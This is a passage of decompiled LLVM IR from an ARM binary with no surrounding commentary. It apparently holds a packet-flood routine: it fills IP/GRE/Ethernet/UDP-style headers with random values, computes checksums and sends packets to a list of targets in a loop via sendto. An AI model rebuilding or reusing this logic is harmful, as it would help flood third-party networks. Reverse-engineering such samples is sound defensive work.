  %v1_bae8 = add i32 %v5_b774, 66
  store i32 %v1_bae8, i32* %r3.global-to-local, align 4
  %v0_baf4.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_baf4.preheader

dec_label_pc_baf4.preheader:                      ; preds = %dec_label_pc_badc, %dec_label_pc_bde4
  %v0_baf4.pre = phi i32 [ %v0_baf4.pre.pre, %dec_label_pc_badc ], [ %v0_b838, %dec_label_pc_bde4 ]
  %stack_var_-160.0.ph = phi i32 [ %v1_bae8, %dec_label_pc_badc ], [ %v1_bdf0, %dec_label_pc_bde4 ]
  %stack_var_-156.0.ph = phi i32 [ %v1_bae4, %dec_label_pc_badc ], [ %v1_bdec, %dec_label_pc_bde4 ]
  %v3_bd44 = icmp eq i32 %v3_b82c, 65535
  %v2_bdb4 = icmp eq i32 %v1_b824, 0
  %v2_bb98 = ptrtoint i32* %stack_var_-44 to i32
  %v2_bbb0 = ptrtoint i32* %stack_var_-48 to i32
  %v2_bbc0 = ptrtoint i32* %stack_var_-52 to i32
  %v2_bbcc = ptrtoint i32* %stack_var_-50 to i32
  %v2_bbe0 = icmp eq i32 %v1_b794, 0
  %v2_bb3c = icmp eq i32 %v5_b7c8, -1
  %v7_bb3c = icmp eq i32 %v5_b7c8, -1
  br label %dec_label_pc_baf4

dec_label_pc_baf4:                                ; preds = %dec_label_pc_bbe8, %dec_label_pc_baf4.preheader
  %v0_baf4 = phi i32 [ %v0_baf4.pre, %dec_label_pc_baf4.preheader ], [ %v1_bcac, %dec_label_pc_bbe8 ]
  %v2_baf4 = icmp eq i32 %v0_baf4, 0
  store i1 %v2_baf4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp98 = icmp slt i32 %v0_baf4, 1
  br label %dec_label_pc_bafc

dec_label_pc_bafc:                                ; preds = %dec_label_pc_bafc, %dec_label_pc_baf4
  br i1 %tmp98, label %dec_label_pc_bafc, label %dec_label_pc_bb00

dec_label_pc_bb00:                                ; preds = %dec_label_pc_bafc
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  br label %dec_label_pc_bb0c

dec_label_pc_bb0c:                                ; preds = %dec_label_pc_bbe8, %dec_label_pc_bb00
  %v1_bb20 = phi i32 [ %v1_bca8, %dec_label_pc_bbe8 ], [ 0, %dec_label_pc_bb00 ]
  %v5_bb10 = mul i32 %v1_bb20, 24
  %v1_bb14 = load i32, i32* @sb, align 4
  %v2_bb14 = add i32 %v1_bb14, %v5_bb10
  store i32 %v2_bb14, i32* %r3.global-to-local, align 4
  store i32 %v2_b6a8, i32* %r1.global-to-local, align 4
  %v1_bb1c = add i32 %v2_bb14, 20
  %v2_bb1c = inttoptr i32 %v1_bb1c to i8*
  %v3_bb1c = load i8, i8* %v2_bb1c, align 1
  %v4_bb1c = zext i8 %v3_bb1c to i32
  store i32 %v4_bb1c, i32* %r2.global-to-local, align 4
  %v4_bb20 = mul i32 %v1_bb20, 4
  %v5_bb20 = add i32 %v4_bb20, %v2_b6a8
  %v6_bb20 = inttoptr i32 %v5_bb20 to i32*
  %v7_bb20 = load i32, i32* %v6_bb20, align 4
  store i32 %v7_bb20, i32* @r5, align 4
  %v7_bb24 = icmp eq i8 %v3_bb1c, 31
  store i1 %v7_bb24, i1* %cpsr_z.global-to-local, align 1
  %v1_bb28 = add i32 %v7_bb20, 24
  store i32 %v1_bb28, i32* @r8, align 4
  %v1_bb2c = add i32 %v7_bb20, 38
  store i32 %v1_bb2c, i32* @r6, align 4
  %v1_bb30 = add i32 %v7_bb20, 58
  store i32 %v1_bb30, i32* @r7, align 4
  %tmp103 = icmp ult i8 %v3_bb1c, 32
  br i1 %tmp103, label %dec_label_pc_bccc, label %dec_label_pc_bb38

dec_label_pc_bb38:                                ; preds = %dec_label_pc_bb0c
  store i32 %v5_b7c8, i32* %r2.global-to-local, align 4
  store i1 %v7_bb3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bb3c, label %dec_label_pc_bd34, label %dec_label_pc_bb44

dec_label_pc_bb44:                                ; preds = %dec_label_pc_bccc, %dec_label_pc_bb38
  store i32 %v3_b82c, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_bd44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_bd44, label %dec_label_pc_bd50, label %dec_label_pc_bb58

dec_label_pc_bb58:                                ; preds = %dec_label_pc_bd34.dec_label_pc_bb58_crit_edge, %dec_label_pc_bb44
  %v1_bb5c = phi i32 [ %v1_bb5c.pre, %dec_label_pc_bd34.dec_label_pc_bb58_crit_edge ], [ 65535, %dec_label_pc_bb44 ]
  store i32 %v3_b830, i32* %r1.global-to-local, align 4
  %v9_bb5c = icmp eq i32 %v3_b830, %v1_bb5c
  store i1 %v9_bb5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bb5c, label %dec_label_pc_bd88, label %dec_label_pc_bb64

dec_label_pc_bb64:                                ; preds = %dec_label_pc_bd50.dec_label_pc_bb64_crit_edge, %dec_label_pc_bb58
  %v1_bb68 = phi i32 [ %v1_bb68.pre, %dec_label_pc_bd50.dec_label_pc_bb64_crit_edge ], [ %v1_bb5c, %dec_label_pc_bb58 ]
  store i32 %v3_b834, i32* %r2.global-to-local, align 4
  %v9_bb68 = icmp eq i32 %v3_b834, %v1_bb68
  store i1 %v9_bb68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bb68, label %dec_label_pc_bda4, label %dec_label_pc_bb70

dec_label_pc_bb70:                                ; preds = %dec_label_pc_bd88, %dec_label_pc_bb64
  store i32 %v1_b824, i32* %r3.global-to-local, align 4
  store i1 %v2_bdb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bdb4, label %dec_label_pc_bdc8, label %.thread24

.thread24:                                        ; preds = %dec_label_pc_bb70
  %v1_bb78 = load i32, i32* @r5, align 4
  %v2_bb78 = add i32 %v1_bb78, 16
  %v3_bb78 = inttoptr i32 %v2_bb78 to i32*
  %v4_bb78 = load i32, i32* %v3_bb78, align 4
  store i32 %v4_bb78, i32* %r3.global-to-local, align 4
  %v2_bb7c = load i32, i32* @r6, align 4
  %v3_bb7c = add i32 %v2_bb7c, 16
  %v4_bb7c = inttoptr i32 %v3_bb7c to i32*
  store i32 %v4_bb78, i32* %v4_bb7c, align 4
  br label %dec_label_pc_bb84

dec_label_pc_bb84:                                ; preds = %bb101, %.thread24, %dec_label_pc_bdc8
  %v0_bb84 = call i32 @function_117dc()
  store i32 %v0_bb84, i32* %r0.global-to-local, align 4
  store i32 %v0_bb84, i32* %stack_var_-44, align 4
  %v0_bb8c = call i32 @function_117dc()
  store i32 %v0_bb8c, i32* %r0.global-to-local, align 4
  store i32 %v0_bb8c, i32* %stack_var_-48, align 4
  %v0_bb94 = call i32 @function_117dc()
  store i32 %v2_bb98, i32* %r1.global-to-local, align 4
  store i32 %v0_bb94, i32* %stack_var_-52, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_bba4 = load i32, i32* @r8, align 4
  store i32 %v0_bba4, i32* %r0.global-to-local, align 4
  %v3_bba8 = call i32 @function_14688(i32 %v0_bba4, i32 %v2_bb98, i32 4)
  %v0_bbac = load i32, i32* @r8, align 4
  %v1_bbac = add i32 %v0_bbac, 6
  store i32 %v1_bbac, i32* %r0.global-to-local, align 4
  store i32 %v2_bbb0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_bbb8 = call i32 @function_14688(i32 %v1_bbac, i32 %v2_bbb0, i32 4)
  %v0_bbbc = load i32, i32* @r8, align 4
  %v1_bbbc = add i32 %v0_bbbc, 4
  store i32 %v1_bbbc, i32* %r0.global-to-local, align 4
  store i32 %v2_bbc0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_bbc8 = call i32 @function_14688(i32 %v1_bbbc, i32 %v2_bbc0, i32 2)
  store i32 %v2_bbcc, i32* %r1.global-to-local, align 4
  %v0_bbd0 = load i32, i32* @r8, align 4
  %v1_bbd0 = add i32 %v0_bbd0, 10
  store i32 %v1_bbd0, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_bbd8 = call i32 @function_14688(i32 %v1_bbd0, i32 %v2_bbcc, i32 2)
  store i32 %v3_bbd8, i32* %r0.global-to-local, align 4
  store i32 %v1_b794, i32* %r1.global-to-local, align 4
  store i1 %v2_bbe0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bbe0, label %dec_label_pc_bbe8, label %dec_label_pc_bdd4

dec_label_pc_bbe8:                                ; preds = %dec_label_pc_bb84, %dec_label_pc_bdd4
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_bbec = load i32, i32* @sl, align 4
  %v1_bbec = trunc i32 %v0_bbec to i8
  %v2_bbec = load i32, i32* @r5, align 4
  %v3_bbec = add i32 %v2_bbec, 10
  %v4_bbec = inttoptr i32 %v3_bbec to i8*
  store i8 %v1_bbec, i8* %v4_bbec, align 1
  %v0_bbf0 = load i32, i32* @sl, align 4
  %v1_bbf0 = trunc i32 %v0_bbf0 to i8
  %v2_bbf0 = load i32, i32* @r5, align 4
  %v3_bbf0 = add i32 %v2_bbf0, 11
  %v4_bbf0 = inttoptr i32 %v3_bbf0 to i8*
  store i8 %v1_bbf0, i8* %v4_bbf0, align 1
  %v0_bbf4 = load i32, i32* @r5, align 4
  store i32 %v0_bbf4, i32* @r0, align 4
  %v2_bbf8 = call i32 @function_fda0(i32 %v0_bbf4, i32 20)
  %v3_bbf8 = trunc i32 %v2_bbf8 to i8
  %v4_bbfc = sdiv i32 %v2_bbf8, 256
  store i32 %v4_bbfc, i32* %r3.global-to-local, align 4
  %v1_bc00 = trunc i32 %v4_bbfc to i8
  %v2_bc00 = load i32, i32* @r5, align 4
  %v3_bc00 = add i32 %v2_bc00, 11
  %v4_bc00 = inttoptr i32 %v3_bc00 to i8*
  store i8 %v1_bc00, i8* %v4_bc00, align 1
  %v3_bc04 = load i32, i32* @r5, align 4
  %v4_bc04 = add i32 %v3_bc04, 10
  %v5_bc04 = inttoptr i32 %v4_bc04 to i8*
  store i8 %v3_bbf8, i8* %v5_bc04, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_bc0c = load i32, i32* @sl, align 4
  %v1_bc0c = trunc i32 %v0_bc0c to i8
  %v2_bc0c = load i32, i32* @r6, align 4
  %v3_bc0c = add i32 %v2_bc0c, 10
  %v4_bc0c = inttoptr i32 %v3_bc0c to i8*
  store i8 %v1_bc0c, i8* %v4_bc0c, align 1
  %v0_bc10 = load i32, i32* @sl, align 4
  %v1_bc10 = trunc i32 %v0_bc10 to i8
  %v2_bc10 = load i32, i32* @r6, align 4
  %v3_bc10 = add i32 %v2_bc10, 11
  %v4_bc10 = inttoptr i32 %v3_bc10 to i8*
  store i8 %v1_bc10, i8* %v4_bc10, align 1
  %v0_bc14 = load i32, i32* @r6, align 4
  store i32 %v0_bc14, i32* @r0, align 4
  %v2_bc18 = call i32 @function_fda0(i32 %v0_bc14, i32 20)
  %v3_bc18 = trunc i32 %v2_bc18 to i8
  store i32 %v2_bc18, i32* %r0.global-to-local, align 4
  %v4_bc1c = sdiv i32 %v2_bc18, 256
  store i32 %v4_bc1c, i32* %r3.global-to-local, align 4
  %v3_bc20 = load i32, i32* @r6, align 4
  %v4_bc20 = add i32 %v3_bc20, 10
  %v5_bc20 = inttoptr i32 %v4_bc20 to i8*
  store i8 %v3_bc18, i8* %v5_bc20, align 1
  %v0_bc24 = load i32, i32* %r3.global-to-local, align 4
  %v1_bc24 = trunc i32 %v0_bc24 to i8
  %v2_bc24 = load i32, i32* @r6, align 4
  %v3_bc24 = add i32 %v2_bc24, 11
  %v4_bc24 = inttoptr i32 %v3_bc24 to i8*
  store i8 %v1_bc24, i8* %v4_bc24, align 1
  %v0_bc28 = load i32, i32* @r7, align 4
  %v1_bc28 = add i32 %v0_bc28, 4
  %v2_bc28 = inttoptr i32 %v1_bc28 to i8*
  %v3_bc28 = load i8, i8* %v2_bc28, align 1
  %v4_bc28 = zext i8 %v3_bc28 to i32
  store i32 %v4_bc28, i32* %r3.global-to-local, align 4
  %v1_bc2c = add i32 %v0_bc28, 5
  %v2_bc2c = inttoptr i32 %v1_bc2c to i8*
  %v3_bc2c = load i8, i8* %v2_bc2c, align 1
  %v4_bc2c = zext i8 %v3_bc2c to i32
  store i32 %v0_bc28, i32* @r1, align 4
  %v4_bc34 = mul nuw nsw i32 %v4_bc2c, 256
  %v5_bc34 = or i32 %v4_bc34, %v4_bc28
  store i32 %v5_bc34, i32* %r2.global-to-local, align 4
  %v0_bc38 = load i32, i32* @sl, align 4
  %v1_bc38 = trunc i32 %v0_bc38 to i8
  %v3_bc38 = add i32 %v0_bc28, 6
  %v4_bc38 = inttoptr i32 %v3_bc38 to i8*
  store i8 %v1_bc38, i8* %v4_bc38, align 1
  store i32 %stack_var_-156.0.ph, i32* %r3.global-to-local, align 4
  %v0_bc40 = load i32, i32* @sl, align 4
  %v1_bc40 = trunc i32 %v0_bc40 to i8
  %v2_bc40 = load i32, i32* @r7, align 4
  %v3_bc40 = add i32 %v2_bc40, 7
  %v4_bc40 = inttoptr i32 %v3_bc40 to i8*
  store i8 %v1_bc40, i8* %v4_bc40, align 1
  %v0_bc44 = load i32, i32* @r6, align 4
  store i32 %v0_bc44, i32* %r0.global-to-local, align 4
  %v4_bc48 = call i32 @function_fdfc(i32 %v0_bc44, i32 %v0_bc28, i32 %v5_bc34, i32 %stack_var_-156.0.ph)
  %v5_bc48 = trunc i32 %v4_bc48 to i8
  store i32 %v4_bc48, i32* %r0.global-to-local, align 4
  %v3_bc4c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bc4c, i32* %r3.global-to-local, align 4
  %v3_bc50 = mul i32 %v3_bc4c, 32
  store i32 %v3_bc50, i32* %r2.global-to-local, align 4
  %v0_bc54 = load i32, i32* @r5, align 4
  %v1_bc54 = add i32 %v0_bc54, 16
  %v2_bc54 = inttoptr i32 %v1_bc54 to i32*
  %v3_bc54 = load i32, i32* %v2_bc54, align 4
  store i32 %v3_bc54, i32* %r1.global-to-local, align 4
  %v5_bc58 = mul i32 %v3_bc4c, 24
  store i32 %v5_bc58, i32* %r2.global-to-local, align 4
  %v4_bc5c39 = udiv i32 %v4_bc48, 256
  %v1_bc60 = trunc i32 %v4_bc5c39 to i8
  %v2_bc60 = load i32, i32* @r7, align 4
  %v3_bc60 = add i32 %v2_bc60, 7
  %v4_bc60 = inttoptr i32 %v3_bc60 to i8*
  store i8 %v1_bc60, i8* %v4_bc60, align 1
  %v0_bc64 = load i32, i32* %r2.global-to-local, align 4
  %v1_bc64 = load i32, i32* @sb, align 4
  %v2_bc64 = add i32 %v1_bc64, %v0_bc64
  store i32 %v2_bc64, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_bc6c = load i32, i32* @r7, align 4
  %v4_bc6c = add i32 %v3_bc6c, 6
  %v5_bc6c = inttoptr i32 %v4_bc6c to i8*
  store i8 %v5_bc48, i8* %v5_bc6c, align 1
  %v0_bc70 = load i32, i32* %r1.global-to-local, align 4
  %v1_bc70 = load i32, i32* %lr.global-to-local, align 4
  %v2_bc70 = add i32 %v1_bc70, 4
  %v3_bc70 = inttoptr i32 %v2_bc70 to i32*
  store i32 %v0_bc70, i32* %v3_bc70, align 4
  %v0_bc74 = load i32, i32* %r3.global-to-local, align 4
  %v1_bc74 = trunc i32 %v0_bc74 to i8
  %v2_bc74 = load i32, i32* %r2.global-to-local, align 4
  %v3_bc74 = load i32, i32* @sb, align 4
  %v4_bc74 = add i32 %v3_bc74, %v2_bc74
  %v5_bc74 = inttoptr i32 %v4_bc74 to i8*
  store i8 %v1_bc74, i8* %v5_bc74, align 1
  %v0_bc78 = load i32, i32* @sl, align 4
  %v1_bc78 = trunc i32 %v0_bc78 to i8
  %v2_bc78 = load i32, i32* %lr.global-to-local, align 4
  %v3_bc78 = add i32 %v2_bc78, 2
  %v4_bc78 = inttoptr i32 %v3_bc78 to i8*
  store i8 %v1_bc78, i8* %v4_bc78, align 1
  %v0_bc7c = load i32, i32* @sl, align 4
  %v1_bc7c = trunc i32 %v0_bc7c to i8
  %v2_bc7c = load i32, i32* %lr.global-to-local, align 4
  %v3_bc7c = add i32 %v2_bc7c, 1
  %v4_bc7c = inttoptr i32 %v3_bc7c to i8*
  store i8 %v1_bc7c, i8* %v4_bc7c, align 1
  %v0_bc80 = load i32, i32* @sl, align 4
  %v1_bc80 = trunc i32 %v0_bc80 to i8
  %v2_bc80 = load i32, i32* %lr.global-to-local, align 4
  %v3_bc80 = add i32 %v2_bc80, 3
  %v4_bc80 = inttoptr i32 %v3_bc80 to i8*
  store i8 %v1_bc80, i8* %v4_bc80, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_bc8c = load i32, i32* @r5, align 4
  store i32 %v0_bc8c, i32* %r1.global-to-local, align 4
  store i32 %v3_b7dc, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-160.0.ph, i32* %r2.global-to-local, align 4
  %v0_bc98 = load i32, i32* %lr.global-to-local, align 4
  %v6_bca0 = call i32 @_sendto(i32 %v3_b7dc, i32 %v0_bc8c, i32 %stack_var_-160.0.ph, i32 16384, i32 %v0_bc98, i32 16)
  %v3_bca4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bca4, i32* %r3.global-to-local, align 4
  %v1_bca8 = add i32 %v3_bca4, 1
  store i32 %v1_bca8, i32* %r0.global-to-local, align 4
  %v1_bcac = load i32, i32* @fp, align 4
  %v9_bcac = icmp eq i32 %v1_bca8, %v1_bcac
  store i1 %v9_bcac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bca8, i32* %stack_var_-40, align 4
  %v6_bcb4 = icmp slt i32 %v1_bca8, %v1_bcac
  br i1 %v6_bcb4, label %dec_label_pc_bb0c, label %dec_label_pc_baf4

dec_label_pc_bcbc:                                ; preds = %dec_label_pc_b7ec
  store i32 %v3_b7dc, i32* %r0.global-to-local, align 4
  %v1_bcc0 = call i32 @_close(i32 %v3_b7dc)
  store i32 %v1_bcc0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bcc4

dec_label_pc_bcc4:                                ; preds = %dec_label_pc_b688, %dec_label_pc_bcbc
  %v29_bcc8 = phi i32 [ %v3_b7dc, %dec_label_pc_b688 ], [ %v1_bcc0, %dec_label_pc_bcbc ]
  store i32 %v3_b688, i32* %r4.global-to-local, align 4
  store i32 %v6_b688, i32* %r5.global-to-local, align 4
  store i32 %v9_b688, i32* %r6.global-to-local, align 4
  store i32 %v12_b688, i32* %r7.global-to-local, align 4
  store i32 %v15_b688, i32* %r8.global-to-local, align 4
  store i32 %v21_b688, i32* %sl.global-to-local, align 4
  ret i32 %v29_bcc8

dec_label_pc_bccc:                                ; preds = %dec_label_pc_bb0c
  %v1_bccc = add i32 %v2_bb14, 16
  %v2_bccc = inttoptr i32 %v1_bccc to i32*
  %v3_bccc = load i32, i32* %v2_bccc, align 4
  store i32 %v3_bccc, i32* %r4.global-to-local, align 4
  %v0_bcd0 = call i32 @function_117dc()
  store i32 %v0_bcd0, i32* %r0.global-to-local, align 4
  %v3_bcd4 = load i32, i32* %stack_var_-40, align 4
  %v5_bcdc = mul i32 %v3_bcd4, 24
  %v0_bce0 = load i32, i32* %r4.global-to-local, align 4
  %v1_bce4 = load i32, i32* @sb, align 4
  %v2_bce4 = add i32 %v1_bce4, %v5_bcdc
  store i32 %v2_bce4, i32* %r1.global-to-local, align 4
  %v1_bce8 = and i32 %v0_bce0, 65280
  store i32 %v1_bce8, i32* %r3.global-to-local, align 4
  %v1_bce0 = udiv i32 %v0_bce0, 256
  %v3_bcec = and i32 %v1_bce0, 65280
  store i32 %v3_bcec, i32* %r2.global-to-local, align 4
  %v3_bcf0 = mul i32 %v0_bce0, 16777216
  store i32 %v3_bcf0, i32* %ip.global-to-local, align 4
  %v1_bcf4 = add i32 %v2_bce4, 20
  %v2_bcf4 = inttoptr i32 %v1_bcf4 to i8*
  %v3_bcf4 = load i8, i8* %v2_bcf4, align 1
  %v4_bcf4 = zext i8 %v3_bcf4 to i32
  store i32 %v4_bcf4, i32* %lr.global-to-local, align 4
  %v4_bcf8 = mul nuw nsw i32 %v1_bce8, 256
  %v5_bcf8 = or i32 %v4_bcf8, %v3_bcf0
  store i32 %v5_bcf8, i32* %ip.global-to-local, align 4
  %v2_bd00 = call i32 @llvm.bswap.i32(i32 %v0_bce0)
  %v7_bd04 = lshr i32 %v0_bcd0, %v4_bcf4
  %v8_bd04 = add i32 %v7_bd04, %v2_bd00
  %v3_bd10 = mul i32 %v8_bd04, 16777216
  %v1_bd14 = and i32 %v8_bd04, 65280
  store i32 %v1_bd14, i32* %r0.global-to-local, align 4
  store i32 %v5_b7c8, i32* %r2.global-to-local, align 4
  %v4_bd20 = mul nuw nsw i32 %v1_bd14, 256
  %v5_bd20 = or i32 %v4_bd20, %v3_bd10
  store i32 %v5_bd20, i32* %r1.global-to-local, align 4
  %v2_bd24 = call i32 @llvm.bswap.i32(i32 %v8_bd04)
  store i32 %v2_bd24, i32* %r3.global-to-local, align 4
  store i1 %v7_bb3c, i1* %cpsr_z.global-to-local, align 1
  %v1_bd2c = load i32, i32* @r5, align 4
  %v2_bd2c = add i32 %v1_bd2c, 16
  %v3_bd2c = inttoptr i32 %v2_bd2c to i32*
  store i32 %v2_bd24, i32* %v3_bd2c, align 4
  br i1 %v2_bb3c, label %dec_label_pc_bd34, label %dec_label_pc_bb44

dec_label_pc_bd34:                                ; preds = %dec_label_pc_bccc, %dec_label_pc_bb38
  %v0_bd34 = call i32 @function_117dc()
  store i32 %v0_bd34, i32* %r0.global-to-local, align 4
  store i32 %v3_b82c, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_bd44, i1* %cpsr_z.global-to-local, align 1
  %v1_bd48 = load i32, i32* @r5, align 4
  %v2_bd48 = add i32 %v1_bd48, 12
  %v3_bd48 = inttoptr i32 %v2_bd48 to i32*
  store i32 %v0_bd34, i32* %v3_bd48, align 4
  br i1 %v3_bd44, label %dec_label_pc_bd50, label %dec_label_pc_bd34.dec_label_pc_bb58_crit_edge

dec_label_pc_bd34.dec_label_pc_bb58_crit_edge:    ; preds = %dec_label_pc_bd34
  %v1_bb5c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bb58

dec_label_pc_bd50:                                ; preds = %dec_label_pc_bd34, %dec_label_pc_bb44
  %v0_bd50 = call i32 @function_117dc()
  %v3_bd58 = urem i32 %v0_bd50, 65536
  store i32 %v3_bd58, i32* %r0.global-to-local, align 4
  %v1_bd60 = sub nsw i32 999, %v3_bd58
  store i32 %v1_bd60, i32* %r2.global-to-local, align 4
  %v3_bd64 = sdiv i32 %v1_bd60, 256
  store i32 %v3_bd64, i32* %r1.global-to-local, align 4
  %v3_bd6838 = udiv i32 %v3_bd58, 256
  store i32 %v3_bd6838, i32* %r3.global-to-local, align 4
  %v1_bd6c = trunc i32 %v3_bd6838 to i8
  %v2_bd6c = load i32, i32* @r5, align 4
  %v3_bd6c = add i32 %v2_bd6c, 5
  %v4_bd6c = inttoptr i32 %v3_bd6c to i8*
  store i8 %v1_bd6c, i8* %v4_bd6c, align 1
  %v0_bd70 = load i32, i32* %r0.global-to-local, align 4
  %v1_bd70 = trunc i32 %v0_bd70 to i8
  %v2_bd70 = load i32, i32* @r5, align 4
  %v3_bd70 = add i32 %v2_bd70, 4
  %v4_bd70 = inttoptr i32 %v3_bd70 to i8*
  store i8 %v1_bd70, i8* %v4_bd70, align 1
  %v0_bd74 = load i32, i32* %r1.global-to-local, align 4
  %v1_bd74 = trunc i32 %v0_bd74 to i8
  %v2_bd74 = load i32, i32* @r6, align 4
  %v3_bd74 = add i32 %v2_bd74, 5
  %v4_bd74 = inttoptr i32 %v3_bd74 to i8*
  store i8 %v1_bd74, i8* %v4_bd74, align 1
  store i32 %v3_b830, i32* %r1.global-to-local, align 4
  %v1_bd7c = load i32, i32* @r4, align 4
  %v9_bd7c = icmp eq i32 %v3_b830, %v1_bd7c
  store i1 %v9_bd7c, i1* %cpsr_z.global-to-local, align 1
  %v0_bd80 = load i32, i32* %r2.global-to-local, align 4
  %v1_bd80 = trunc i32 %v0_bd80 to i8
  %v2_bd80 = load i32, i32* @r6, align 4
  %v3_bd80 = add i32 %v2_bd80, 4
  %v4_bd80 = inttoptr i32 %v3_bd80 to i8*
  store i8 %v1_bd80, i8* %v4_bd80, align 1
  %v0_bd84 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bd84, label %dec_label_pc_bd88, label %dec_label_pc_bd50.dec_label_pc_bb64_crit_edge

dec_label_pc_bd50.dec_label_pc_bb64_crit_edge:    ; preds = %dec_label_pc_bd50
  %v1_bb68.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bb64

dec_label_pc_bd88:                                ; preds = %dec_label_pc_bd50, %dec_label_pc_bb58
  %v0_bd88 = call i32 @function_117dc()
  %v1_bd88 = trunc i32 %v0_bd88 to i8
  store i32 %v0_bd88, i32* %r0.global-to-local, align 4
  store i32 %v3_b834, i32* %r2.global-to-local, align 4
  %v4_bd90 = sdiv i32 %v0_bd88, 256
  store i32 %v4_bd90, i32* %r3.global-to-local, align 4
  %v1_bd94 = load i32, i32* @r4, align 4
  %v9_bd94 = icmp eq i32 %v3_b834, %v1_bd94
  store i1 %v9_bd94, i1* %cpsr_z.global-to-local, align 1
  %v3_bd98 = load i32, i32* @r5, align 4
  %v4_bd98 = add i32 %v3_bd98, 58
  %v5_bd98 = inttoptr i32 %v4_bd98 to i8*
  store i8 %v1_bd88, i8* %v5_bd98, align 1
  %v0_bd9c = load i32, i32* %r3.global-to-local, align 4
  %v1_bd9c = trunc i32 %v0_bd9c to i8
  %v2_bd9c = load i32, i32* @r7, align 4
  %v3_bd9c = add i32 %v2_bd9c, 1
  %v4_bd9c = inttoptr i32 %v3_bd9c to i8*
  store i8 %v1_bd9c, i8* %v4_bd9c, align 1
  %v0_bda0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bda0, label %dec_label_pc_bda4, label %dec_label_pc_bb70

dec_label_pc_bda4:                                ; preds = %dec_label_pc_bd88, %dec_label_pc_bb64
  %v0_bda4 = call i32 @function_117dc()
  %v1_bda4 = trunc i32 %v0_bda4 to i8
  store i32 %v0_bda4, i32* %r0.global-to-local, align 4
  %v4_bda840 = udiv i32 %v0_bda4, 256
  %v1_bdac = trunc i32 %v4_bda840 to i8
  %v2_bdac = load i32, i32* @r7, align 4
  %v3_bdac = add i32 %v2_bdac, 3
  %v4_bdac = inttoptr i32 %v3_bdac to i8*
  store i8 %v1_bdac, i8* %v4_bdac, align 1
  store i32 %v1_b824, i32* %r3.global-to-local, align 4
  store i1 %v2_bdb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bdb4, label %bb100, label %bb99

bb99:                                             ; preds = %dec_label_pc_bda4
  %v1_bdb8 = load i32, i32* @r5, align 4
  %v2_bdb8 = add i32 %v1_bdb8, 16
  %v3_bdb8 = inttoptr i32 %v2_bdb8 to i32*
  %v4_bdb8 = load i32, i32* %v3_bdb8, align 4
  store i32 %v4_bdb8, i32* %r3.global-to-local, align 4
  br label %bb100

bb100:                                            ; preds = %dec_label_pc_bda4, %bb99
  %v3_bdbc = load i32, i32* @r7, align 4
  %v4_bdbc = add i32 %v3_bdbc, 2
  %v5_bdbc = inttoptr i32 %v4_bdbc to i8*
  store i8 %v1_bda4, i8* %v5_bdbc, align 1
  %v0_bdc0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bdc0, label %dec_label_pc_bdc8, label %bb101

bb101:                                            ; preds = %bb100
  %v1_bdc0 = load i32, i32* %r3.global-to-local, align 4
  %v2_bdc0 = load i32, i32* @r6, align 4
  %v3_bdc0 = add i32 %v2_bdc0, 16
  %v4_bdc0 = inttoptr i32 %v3_bdc0 to i32*
  store i32 %v1_bdc0, i32* %v4_bdc0, align 4
  br label %dec_label_pc_bb84

dec_label_pc_bdc8:                                ; preds = %dec_label_pc_bb70, %bb100
  %v0_bdc8 = call i32 @function_117dc()
  store i32 %v0_bdc8, i32* %r0.global-to-local, align 4
  %v1_bdcc = load i32, i32* @r6, align 4
  %v2_bdcc = add i32 %v1_bdcc, 16
  %v3_bdcc = inttoptr i32 %v2_bdcc to i32*
  store i32 %v0_bdc8, i32* %v3_bdcc, align 4
  br label %dec_label_pc_bb84

dec_label_pc_bdd4:                                ; preds = %dec_label_pc_bb84
  %v0_bdd4 = load i32, i32* @r7, align 4
  %v1_bdd4 = add i32 %v0_bdd4, 8
  store i32 %v1_bdd4, i32* %r0.global-to-local, align 4
  store i32 %v5_b774, i32* @r1, align 4
  %v1_bddc = inttoptr i32 %v1_bdd4 to i8*
  %v2_bddc = call i32 @function_119b8(i8* %v1_bddc)
  store i32 %v2_bddc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bbe8

dec_label_pc_bde4:                                ; preds = %dec_label_pc_b814
  %v1_bdec = add i32 %v5_b774, 8
  store i32 %v1_bdec, i32* %r1.global-to-local, align 4
  %v1_bdf0 = add i32 %v5_b774, 66
  store i32 %v1_bdf0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_baf4.preheader

; uselistorder directives
  uselistorder i32 %v1_bdf0, { 1, 0 }
  uselistorder i32 %v1_bdec, { 1, 0 }
  uselistorder i32 %v0_bda4, { 0, 2, 1 }
